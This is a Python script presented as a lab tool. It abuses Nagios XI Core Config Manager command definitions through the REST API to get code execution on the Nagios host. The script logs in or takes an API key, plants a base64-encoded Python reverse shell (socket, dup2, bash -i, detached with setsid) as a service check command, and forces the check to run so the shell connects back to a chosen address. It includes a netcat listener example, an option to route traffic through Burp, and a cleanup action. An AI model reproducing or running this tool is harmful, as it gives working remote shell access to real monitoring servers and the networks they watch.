#!/usr/bin/env python3
"""
nagios_ccm_rshell.py - Nagios XI CCM reverse shell lab tool by pizzapower

Demonstrates that a Nagios XI Core Config Manager (CCM) *command* definition
executes arbitrary code on the Nagios XI host when it is attached to a service
check. Running commands is what CCM is for (it runs monitoring plugins). 

Tested on: a Nagios XI 2026R2 in my lab

Actions:
    setup     create the command + service, apply config
    fire      force an immediate service check (triggers the payload now)
    status    show the service state / last check / plugin output
    cleanup   delete the service + command, apply config
    all       setup, wait for apply, then fire

Only the Python standard library is required.

Example:
    # start a listener:  nc -lvnp 4444
    python3 nagios_ccm_rshell.py all
    # ... use the shell ...
    python3 nagios_ccm_rshell.py cleanup
"""

import argparse
import base64
import getpass
import json
import os
import re
import ssl
import sys
import time
import urllib.parse
import urllib.request

# --- Lab defaults (override on the command line or via env) -------------------
DEFAULT_URL     = "http://127.0.0.1:8080/nagiosxi"
DEFAULT_APIKEY  = ""
DEFAULT_LHOST   = "127.0.0.1"     
DEFAULT_LPORT   = 4444
DEFAULT_HOST    = "localhost"
DEFAULT_SERVICE = "Reverse Shell Test"
DEFAULT_COMMAND = "lab_rshell"
DEFAULT_TEMPLATE = "generic-service"
DEFAULT_CONTACT_GROUP = "xi_roles_1"


class XIError(Exception):
    pass


def build_command_line(lhost, lport):
    """Return the Nagios command_line that spawns a detached reverse shell.

    The Python payload is base64 enc so the stored command_line contains no
    characters special to the Nagios config format (no ';' inline-comment, no
    '#', no '$' macro). 'setsid' detaches the shell into its own session so it
    survives Nagios reaping the check at service_check_timeout (default 60s).
    The foreground 'echo' makes the check return a plugin line and exit 0.
    """
    py = (
        "import socket,os,subprocess\n"
        "s=socket.socket()\n"
        "s.connect(('%s',%d))\n"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
        "subprocess.call(['/bin/bash','-i'])\n"
    ) % (lhost, lport)
    b64 = base64.b64encode(py.encode()).decode()
    return ("echo %s | base64 -d | setsid python3 >/dev/null 2>&1 & "
            "echo CCM-RSHELL-FIRED" % b64)


class XI:
    def __init__(self, base_url, apikey, insecure=False, verbose=False, proxy=None):
        self.base = base_url.rstrip("/")
        self.api = self.base + "/api/v1"
        self.apikey = apikey
        self.verbose = verbose
        ctx = None
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        handlers = []
        if ctx is not None:
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
        # Explicit ProxyHandler: {} ignores HTTP(S)_PROXY env unless --proxy is
        # given, so traffic only goes through Burp when asked. An explicit dict
        # also proxies localhost (no automatic bypass), which is what Burp needs.
        proxies = {"http": proxy, "https": proxy} if proxy else {}
        handlers.append(urllib.request.ProxyHandler(proxies))
        self.opener = urllib.request.build_opener(*handlers)
        if proxy and verbose:
            print("  [proxy] %s" % proxy, file=sys.stderr)

    def _call(self, method, path, params):
        data = dict(params)
        if self.apikey:
            data["apikey"] = self.apikey
        encoded = urllib.parse.urlencode(data, doseq=True).encode()
        url = "%s/%s" % (self.api, path)
        if method in ("GET", "DELETE"):
            url += "?" + encoded.decode()
            body = None
        else:
            body = encoded
        req = urllib.request.Request(url, data=body, method=method)
        if self.verbose:
            shown = {k: ("<redacted>" if k in ("apikey", "password") else v)
                     for k, v in data.items()}
            print("  [%s %s] %s" % (method, path, shown), file=sys.stderr)
        try:
            with self.opener.open(req, timeout=30) as r:
                raw = r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            raw = e.read().decode(errors="replace")
        except urllib.error.URLError as e:
            raise XIError("cannot reach %s: %s" % (url, e.reason))
        try:
            return json.loads(raw)
        except ValueError:
            return {"_raw": raw}

    def get(self, path, **params):
        return self._call("GET", path, params)

    def post(self, path, **params):
        return self._call("POST", path, params)

    def delete(self, path, **params):
        return self._call("DELETE", path, params)

    def resolve_apikey(self, username, password):
        """Turn username/password into that user's API key, over HTTP only.

        1) POST api/v1/authenticate (no CSRF) -> short-lived auth_token
        2) GET account/main.php?token=... -> the page carries the user's api_key
        The password change does NOT rotate the api_key, so this keeps working
        after you change your password; it only changes if you reset the key.
        """
        r = self._call("POST", "authenticate",
                       {"username": username, "password": password, "valid_min": 5})
        token = r.get("auth_token") if isinstance(r, dict) else None
        if not token:
            reason = r.get("message") if isinstance(r, dict) else None
            raise XIError("authenticate failed: %s" % (reason or summarize(r)))
        url = "%s/account/main.php?token=%s" % (self.base, urllib.parse.quote(token))
        try:
            with self.opener.open(urllib.request.Request(url), timeout=30) as resp:
                html = resp.read().decode(errors="replace")
        except urllib.error.URLError as e:
            raise XIError("cannot reach account page: %s" % e)
        m = re.search(r'(?:id|name)="apikey"[^>]*value="([A-Za-z0-9]+)"', html)
        if not m:
            raise XIError("logged in but could not read API key from account page")
        return m.group(1)


def ok(resp):
    return isinstance(resp, dict) and "success" in resp


LOGFILE = None


def log(msg):
    """One-line, timestamped; printed and appended to LOGFILE if set."""
    line = "%s %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    print(line)
    if LOGFILE:
        try:
            with open(LOGFILE, "a") as f:
                f.write(line + "\n")
        except OSError:
            pass


def summarize(resp):
    """Short one-line result from an API response."""
    if not isinstance(resp, dict):
        return str(resp)[:100]
    s = resp.get("success") or resp.get("error") or resp.get("_raw") or json.dumps(resp)
    s = " ".join(str(s).split())
    return s if len(s) <= 100 else s[:97] + "..."


def apply_config(xi):
    r = xi.post("system/applyconfig")
    log("apply config -> %s" % summarize(r))
    # applyconfig is async (writes cfg + reloads core); wait for registration.
    time.sleep(10)


def do_setup(xi, args):
    cmdline = build_command_line(args.lhost, args.lport)
    log("writing command '%s'" % args.command)
    r = xi.post("config/command", command_name=args.command, command_line=cmdline)
    if not ok(r) and "already exists" not in json.dumps(r).lower():
        raise XIError("command create failed: %s" % summarize(r))
    log("  command '%s' -> %s" % (args.command, summarize(r)))

    log("creating service '%s' on host '%s'" % (args.service, args.host))
    r = xi.post(
        "config/service",
        host_name=args.host,
        service_description=args.service,
        check_command=args.command,
        use=args.template,
        check_interval=args.check_interval,
        retry_interval=1,
        max_check_attempts=1,
        check_period="24x7",
        notification_interval=0,
        notification_period="24x7",
        contact_groups=args.contact_group,
    )
    if not ok(r) and "already exists" not in json.dumps(r).lower():
        raise XIError("service create failed: %s" % summarize(r))
    log("  service '%s' -> %s" % (args.service, summarize(r)))

    apply_config(xi)
    log("setup done: command=%s  service=%s/%s" % (args.command, args.host, args.service))
    log("manual delete in CCM: Commands '%s' + host '%s' service '%s', then Apply Config"
        % (args.command, args.host, args.service))


def service_known(xi, args):
    """True once the running core recognises the service object."""
    r = xi.get("objects/service", host_name=args.host, service_description=args.service)
    return isinstance(r, dict) and int(r.get("recordcount", 0) or 0) > 0


def do_fire(xi, args, retries=8, delay=8):
    log("force check %s/%s" % (args.host, args.service))
    params = {"services[%s][]" % args.host: args.service}
    # After an apply the core reload can lag (slow under emulation). the forced
    # check is rejected until the object is registered, so retry with backoff.
    last = None
    for attempt in range(1, retries + 1):
        r = xi._call("POST", "system/massimmediatecheck", params)
        if ok(r):
            log("  fired -> %s (shell to %s:%d as nagios)"
                % (summarize(r), args.lhost, args.lport))
            return
        last = r
        log("  core not ready, retry %d/%d in %ds" % (attempt, retries, delay))
        time.sleep(delay)
    raise XIError("force-check failed after %d attempts: %s" % (retries, summarize(last)))


def do_status(xi, args):
    r = xi.get("objects/service", host_name=args.host, service_description=args.service)
    cnt = r.get("recordcount", 0) if isinstance(r, dict) else 0
    if not cnt:
        log("status %s/%s -> not found" % (args.host, args.service))
        return
    svc = r["service"][0] if isinstance(r.get("service"), list) else r["service"]
    out = svc.get("output") or svc.get("plugin_output") or ""
    log("status %s/%s -> state=%s last_check=%s cmd=%s | %s"
        % (args.host, args.service, svc.get("current_state"), svc.get("last_check"),
           svc.get("check_command"), out[:60]))


def do_cleanup(xi, args):
    r = xi.delete("config/service", host_name=args.host, service_description=args.service)
    log("delete service '%s' -> %s" % (args.service, summarize(r)))
    r = xi.delete("config/command", command_name=args.command)
    log("delete command '%s' -> %s" % (args.command, summarize(r)))
    apply_config(xi)
    log("cleanup done")


def print_next_steps(xi, args):
    """Footer after a successful run: console URLs + the exact cleanup command.

    Reuses --username (which prompts for the password) so no secret is printed
    or written to the logfile.
    """
    prog = os.path.basename(sys.argv[0])
    ccm = "%s/includes/components/ccm/index.php" % xi.base
    auth = "--username %s" % args.username if args.username else "--apikey <APIKEY>"
    log("---- next steps ----")
    log("CCM home     : %s" % ccm)
    log("CCM commands : %s?cmd=view&type=command  (find '%s')" % (ccm, args.command))
    log("CCM services : %s?cmd=view&type=service  (find '%s')" % (ccm, args.service))
    log("check (cli)  : python3 %s status --url %s --host %s --service '%s' %s"
        % (prog, args.url, args.host, args.service, auth))
    log("cleanup      : python3 %s cleanup --url %s --host %s --service '%s' --command %s %s"
        % (prog, args.url, args.host, args.service, args.command, auth))
    if args.username:
        log("               (cleanup/check prompt for the password, or set NAGIOSXI_PASS)")


def main():
    p = argparse.ArgumentParser(
        description="Nagios XI CCM reverse shell tool.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="actions: setup | fire | status | cleanup | all")
    p.add_argument("action", choices=["setup", "fire", "status", "cleanup", "all"])
    p.add_argument("--url", default=os.environ.get("NAGIOSXI_URL", DEFAULT_URL),
                   help="Nagios XI base URL (default %(default)s)")
    p.add_argument("--apikey", default=os.environ.get("NAGIOSXI_APIKEY", DEFAULT_APIKEY),
                   help="Nagios XI API key (env NAGIOSXI_APIKEY)")
    p.add_argument("--username", default=os.environ.get("NAGIOSXI_USER"),
                   help="log in with these creds and auto-resolve the API key "
                        "(overrides --apikey; env NAGIOSXI_USER)")
    p.add_argument("--password", default=os.environ.get("NAGIOSXI_PASS"),
                   help="password for --username (env NAGIOSXI_PASS; prompts if omitted)")
    p.add_argument("--lhost", default=DEFAULT_LHOST,
                   help="connect-back address, reachable from the Nagios "
                        "server (default %(default)s)")
    p.add_argument("--lport", type=int, default=DEFAULT_LPORT)
    p.add_argument("--host", default=DEFAULT_HOST, help="host object to attach to")
    p.add_argument("--service", default=DEFAULT_SERVICE)
    p.add_argument("--command", default=DEFAULT_COMMAND)
    p.add_argument("--template", default=DEFAULT_TEMPLATE)
    p.add_argument("--contact-group", default=DEFAULT_CONTACT_GROUP)
    p.add_argument("--check-interval", type=int, default=5)
    p.add_argument("-k", "--insecure", action="store_true",
                   help="skip TLS verification (for https:// self-signed, "
                        "and for intercepting https through Burp's CA)")
    p.add_argument("--proxy", default=os.environ.get("NAGIOSXI_PROXY"),
                   help="route API traffic through this proxy, "
                        "e.g. http://127.0.0.1:8081 (env NAGIOSXI_PROXY)")
    p.add_argument("--burp", action="store_true",
                   help="shorthand for --proxy http://127.0.0.1:8080")
    p.add_argument("--logfile",
                   default=os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        "nagios_ccm_rshell.log"),
                   help="append one-line logs here (default beside the script; "
                        "pass '' to disable)")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    global LOGFILE
    LOGFILE = args.logfile or None

    proxy = args.proxy
    if args.burp and not proxy:
        proxy = "http://127.0.0.1:8080"

    xi = XI(args.url, args.apikey, insecure=args.insecure,
            verbose=args.verbose, proxy=proxy)
    try:
        if args.username:
            pw = args.password
            if not pw:
                try:
                    pw = getpass.getpass("Password for %s: " % args.username)
                except (EOFError, OSError):
                    raise XIError("no password (use --password or NAGIOSXI_PASS "
                                  "when there is no interactive terminal)")
            xi.apikey = None
            xi.apikey = xi.resolve_apikey(args.username, pw)
            log("resolved API key for user '%s'" % args.username)
        if not xi.apikey:
            raise XIError("no credentials: pass --apikey or --username/--password")

        if args.action == "setup":
            do_setup(xi, args)
        elif args.action == "fire":
            do_fire(xi, args)
        elif args.action == "status":
            do_status(xi, args)
        elif args.action == "cleanup":
            do_cleanup(xi, args)
        elif args.action == "all":
            do_setup(xi, args)
            log("waiting for core to register the service")
            for _ in range(12):
                if service_known(xi, args):
                    break
                time.sleep(5)
            do_fire(xi, args)

        if args.action in ("setup", "fire", "all"):
            print_next_steps(xi, args)
    except XIError as e:
        print("[!] %s" % e, file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
